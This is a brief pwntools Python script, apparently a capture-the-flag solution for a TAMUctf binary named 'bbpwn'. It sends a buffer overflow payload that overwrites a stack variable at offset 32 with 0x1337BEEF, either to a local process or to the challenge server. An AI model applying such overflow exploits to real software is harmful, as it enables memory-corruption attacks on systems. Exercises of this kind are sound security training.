from pwn import *
import sys

context.clear(os='linux')

__author__ = 'yuvaly0'

argv = sys.argv
binary_path = './bbpwn'
REMOTE = False
DEBUG = False

if len(argv) > 1:
	if argv[1] == 'remote':
		REMOTE = True
	if argv[1] == 'debug':
		DEBUG = True

if REMOTE:
	sh = remote('challenges.tamuctf.com', 4252)
else:
	sh = process([binary_path])

if DEBUG:
	gdb.attach(sh, '''
		b* main+103
		''')

e = ELF(binary_path)

# ------------- plan -----------
# overwrite variable using bof

overflow_offset = 32
value_we_want = 0x1337BEEF

payload = fit({
	overflow_offset: value_we_want
	})

sh.sendlineafter('Enter a string: ', payload)

print sh.recvline()